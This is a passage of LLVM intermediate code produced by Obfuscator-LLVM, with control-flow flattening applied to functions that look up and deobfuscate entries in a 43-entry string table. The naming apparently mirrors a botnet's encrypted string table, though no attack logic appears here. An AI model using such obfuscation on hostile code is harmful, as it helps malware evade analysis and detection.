  store i8 %83, i8* %79, align 1
  store i32 -571583338, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %3, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %3, align 4
  store i32 230277075, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %84, %35, %27, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %.reg2mem = alloca i32*
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [43 x %struct.table_value], [43 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  store i32* %9, i32** %.reg2mem
  %switchVar = alloca i32
  store i32 129143209, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 129143209, label %first
    i32 1641088544, label %12
    i32 1796623280, label %18
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32*, i32** %.reg2mem
  %10 = icmp ne i32* %.reload, null
  %11 = select i1 %10, i32 1641088544, i32 1796623280
  store i32 %11, i32* %switchVar
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load %struct.table_value*, %struct.table_value** %5, align 8
  %14 = getelementptr inbounds %struct.table_value, %struct.table_value* %13, i32 0, i32 1
  %15 = load i16, i16* %14, align 8
  %16 = zext i16 %15 to i32
  %17 = load i32*, i32** %4, align 8
  store i32 %16, i32* %17, align 4
  store i32 1796623280, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load %struct.table_value*, %struct.table_value** %5, align 8
  %20 = getelementptr inbounds %struct.table_value, %struct.table_value* %19, i32 0, i32 0
  %21 = load i8*, i8** %20, align 8
  ret i8* %21

loopEnd:                                          ; preds = %12, %first, %switchDefault
  br label %loopEntry
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
